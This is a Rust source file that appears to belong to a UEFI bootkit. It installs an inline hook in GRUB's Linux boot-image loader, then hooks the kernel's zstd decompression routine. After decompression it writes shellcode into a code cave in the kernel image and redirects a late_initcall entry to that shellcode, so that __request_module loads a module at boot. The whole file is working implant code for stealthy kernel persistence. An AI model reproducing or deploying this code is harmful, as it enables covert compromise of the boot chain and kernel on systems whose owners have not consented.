use log::{debug, error, info};

use crate::helpers::{
    file_helper::{cave_finder, Permissions},
    memory_helper::{
        binary_search, get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
        translate_physical_to_virtual, InitcallPhase, InlineHook, INLINE_HOOK_SIZE,
        ZSTD_DECOMPRESS_FUNC_SIGNATURE,
    },
};

pub static mut GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

const REQUEST_MODULE_DISTANCE: u8 = 0x45;
const REQUEST_MODULE_PATTERN: &[u8] = &[0x65, 0x48, 0x8B, 0x05, 0xAB, 0x95];
const REQUEST_MODULE_SENTINEL: u64 = 0xDEADBEEFDEADBEEF;
const ORIGINAL_FN_SENTINEL: u64 = 0xCAFEBABECAFEBABE;

/// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
/// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
///
/// # Arguments
/// - `kernel_entry`: The entry point of the Linux kernel.
/// - `kernel_size`: The size of the Linux kernel.
/// - `args`: Additional arguments passed to the original function.
///
/// # Returns
/// - `i32`: The return value from the original function, or -1 if an error occurs.
pub extern "C" fn grub_arch_efi_linux_boot_image_hook(
    kernel_entry: usize,
    kernel_size: usize,
    args: *const u8,
) -> i32 {
    let original_fn_addr: usize;
    let real_kernel_entry: usize;
    unsafe {
        core::arch::asm!(
            "mov {}, rax",
            out(reg) original_fn_addr,
            options(nomem, nostack, preserves_flags)
        );
        core::arch::asm!(
            "mov {}, r12",
            out(reg) real_kernel_entry,
            options(nomem, nostack, preserves_flags)
        );
    }

    debug!(
        "grub_arch_efi_linux_boot_image_hook called with kernel_entry: {:#x}, kernel_size: {:#x}, args: {:#x}",
        real_kernel_entry, kernel_size, args as usize
    );

    // Snapshot hook state once so restore/jump use the same values.
    let mut target = unsafe {
        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.target).read_volatile()
    };
    let original_bytes = unsafe {
        core::ptr::addr_of!(GRUB_ARCH_EFI_LINUX_BOOT_IMAGE_HOOK_INLINE.original_bytes)
            .read_volatile()
    };

    if target == 0 {
        error!("Hook target was not initialized");
        return -1;
    }

    if original_fn_addr == 0 {
        error!("Original function address was not preserved");
        return -1;
    }

    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }

    let original_fn: extern "C" fn(usize, usize, *const u8) -> i32 =
        unsafe { core::mem::transmute(original_fn_addr) };

    // Finding zstd_decompress_dctx in vmlinuz.
    target = match binary_search(
        real_kernel_entry as usize,
        kernel_size as usize,
        ZSTD_DECOMPRESS_FUNC_SIGNATURE,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find target function in original GRUB");

            return original_fn(kernel_entry, kernel_size, args);
        }
    };

    if target == 0 {
        error!("Failed to find target function in original GRUB");

        return original_fn(kernel_entry, kernel_size, args);
    }
    debug!("Found target function at address: {:#x}", target);

    // Hooking vmlinuz's decompression functions.
    let vmlinuz_hook = zstd_decompress_dctx_hook as *const () as usize;
    let hook_info = match inline_jump_hook(target, vmlinuz_hook) {
        Ok(info) => info,
        Err(e) => {
            error!("Failed to install inline hook, reason {:?}", e);

            return original_fn(kernel_entry, kernel_size, args);
        }
    };
    unsafe {
        ZSTD_DECOMPRESS_DCTX_HOOK_INLINE = hook_info;
    }
    debug!(
        "Installed zstd_decompress_dctx_hook at address: {:#x}",
        vmlinuz_hook
    );

    // Call the original callee that was held in rax at the patched call site.
    original_fn(kernel_entry, kernel_size, args)
}

/// zstd_decompress_dctx_hook is an inline hook for the zstd_decompress_dctx function in the Linux kernel.
///
/// # Arguments:
/// - `dctx`: The decompression context.
/// - `dst`: The destination buffer for the decompressed data.
/// - `dst_capacity`: The capacity of the destination buffer.
/// - `src`: The source buffer containing the compressed data.
/// - `src_size`: The size of the source buffer.
///
/// # Returns:
/// - `isize`: The return value from the original function, or -1 if an error occurs.
pub extern "sysv64" fn zstd_decompress_dctx_hook(
    dctx: usize,
    dst: usize,
    dst_capacity: usize,
    src: usize,
    src_size: usize,
) -> isize {
    debug!(
        "zstd_decompress_dctx_hook called with dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );

    let target =
        unsafe { core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.target).read_volatile() };
    let original_bytes = unsafe {
        core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.original_bytes).read_volatile()
    };
    if target == 0 {
        error!("Hook target was not initialized");

        return -1;
    }
    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }
    let original_fn: extern "sysv64" fn(usize, usize, usize, usize, usize) -> isize =
        unsafe { core::mem::transmute(target) };
    let ret_val = original_fn(dctx, dst, dst_capacity, src, src_size);

    debug!(
        "zstd_decompress_dctx state is now: dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );
    info!(
        "Decompressed linux kernel is at address: {:#x}, size: {:#x}",
        dst, dst_capacity
    );

    // Deploy the kernel hook: overwrite the late_initcall slot to point at our
    // shellcode in the code cave, which calls __request_module then tail-calls
    // the original initcall target.
    let initcall_info =
        match get_initcall_phase_address(dst, dst_capacity, InitcallPhase::LateInitcall) {
            Some(info) => info,
            None => {
                error!("Failed to find late_initcall address in kernel");
                return ret_val;
            }
        };
    debug!(
        "Found late_initcall entry: entry_phys={:#x}, entry_virt={:#x}, original_target_virt={:#x}",
        initcall_info.entry_physical_address, initcall_info.entry_virtual_address, initcall_info.original_target_virtual_address
    );

    let code_cave = match cave_finder(
        dst,
        dst_capacity,
        0x1000,
        Permissions::READ | Permissions::EXECUTE,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find suitable code cave in kernel");
            return ret_val;
        }
    };
    debug!("Found suitable code cave at address: {:#x}", code_cave);

    // Locate __request_module in the decompressed kernel.
    let mut request_module_phys = match binary_search(dst, dst_capacity, REQUEST_MODULE_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find __request_module in kernel");
            return ret_val;
        }
    };
    request_module_phys -= REQUEST_MODULE_DISTANCE as usize;

    // Translate physical addresses to kernel virtual addresses for the shellcode.
    let request_module_virt =
        match translate_physical_to_virtual(dst, dst_capacity, request_module_phys) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate __request_module to virtual address");
                return ret_val;
            }
        };
    debug!(
        "__request_module: phys={:#x}, virt={:#x}",
        request_module_phys, request_module_virt
    );

    let code_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, code_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate code cave to virtual address");
            return ret_val;
        }
    };
    debug!(
        "Code cave: phys={:#x}, virt={:#x}",
        code_cave, code_cave_virt
    );

    // Load the pre-assembled shellcode blob and patch the sentinel values.
    let shellcode_template: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
    let mut shellcode = [0u8; 512];
    let shellcode_len = shellcode_template.len();
    shellcode[..shellcode_len].copy_from_slice(shellcode_template);

    // Patch 0xDEADBEEFDEADBEEF -> __request_module virtual address.
    let sentinel_bytes = REQUEST_MODULE_SENTINEL.to_le_bytes();
    if let Some(offset) = find_sentinel(&shellcode[..shellcode_len], &sentinel_bytes) {
        shellcode[offset..offset + 8].copy_from_slice(&(request_module_virt as u64).to_le_bytes());
    } else {
        error!("Failed to find request_module sentinel in shellcode");
        return ret_val;
    }

    // Patch 0xCAFEBABECAFEBABE -> original initcall target virtual address.
    let sentinel_bytes = ORIGINAL_FN_SENTINEL.to_le_bytes();
    if let Some(offset) = find_sentinel(&shellcode[..shellcode_len], &sentinel_bytes) {
        shellcode[offset..offset + 8]
            .copy_from_slice(&(initcall_info.original_target_virtual_address as u64).to_le_bytes());
    } else {
        error!("Failed to find original_fn sentinel in shellcode");
        return ret_val;
    }

    // Write the patched shellcode into the code cave.
    unsafe {
        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), code_cave as *mut u8, shellcode_len);
    }
    debug!(
        "Wrote {} bytes of shellcode to code cave at {:#x}",
        shellcode_len, code_cave
    );

    // Overwrite the last late_initcall prel32 entry to point at our shellcode.
    let relative_offset =
        (code_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
    if relative_offset < i32::MIN as i64 || relative_offset > i32::MAX as i64 {
        error!(
            "Code cave too far from initcall entry for prel32: delta={:#x}",
            relative_offset
        );
        return ret_val;
    }
    unsafe {
        core::ptr::write(
            initcall_info.entry_physical_address as *mut i32,
            relative_offset as i32,
        );
    }
    info!(
        "Patched late_initcall entry at virt={:#x} (phys={:#x}) with prel32 offset {:#x} -> shellcode at virt={:#x}",
        initcall_info.entry_virtual_address, initcall_info.entry_physical_address, relative_offset as i32, code_cave_virt
    );

    ret_val
}

/// Finds the byte offset of an 8-byte sentinel value within a buffer.
fn find_sentinel(buf: &[u8], sentinel: &[u8; 8]) -> Option<usize> {
    buf.windows(8).position(|w| w == sentinel)
}
